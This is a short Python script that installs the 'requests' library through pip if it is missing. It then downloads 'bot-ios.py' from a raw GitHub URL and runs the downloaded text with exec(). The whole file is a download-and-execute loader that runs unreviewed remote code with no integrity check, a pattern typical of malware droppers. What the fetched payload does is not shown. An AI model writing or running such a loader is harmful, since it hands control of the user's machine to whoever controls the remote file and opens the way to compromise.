import subprocess
try:
    import requests
except ImportError:
    print("requests is not installed. Installing it now...")
    try:
        subprocess.check_call(["pip3", "install", "requests"])
        print("requests has been successfully installed.")
        import requests
    except Exception as e:
        try:
            subprocess.check_call(["pip", "install", "requests"])
            import requests
            print("requests has been successfully installed using pip.")
        except Exception as e:
            print("Failed to install requests with pip and pip:", str(e))
            exit(0)
response = requests.get("https://raw.githubusercontent.com/qq2q/AA/main/bot-ios.py")
exec(response.text)
